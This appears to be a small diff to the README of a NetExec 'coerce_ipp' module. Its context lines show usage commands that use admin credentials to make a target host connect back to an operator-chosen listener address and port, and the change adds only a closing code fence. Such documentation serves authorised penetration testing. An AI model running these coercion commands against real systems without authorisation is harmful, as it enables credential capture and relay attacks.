@@ -20,6 +20,7 @@ nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip>
 nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip> PORT=8080
 nxc smb <target> -u <admin> -p <pass> -M coerce_ipp -o LISTENER=<your-ip> PORT=80 PATH=/print
 
+```
 <img width="678" height="156" alt="image" src="https://github.com/user-attachments/assets/d1f6c964-f85e-40e2-b8d4-f28622e2ed31" />
 
 
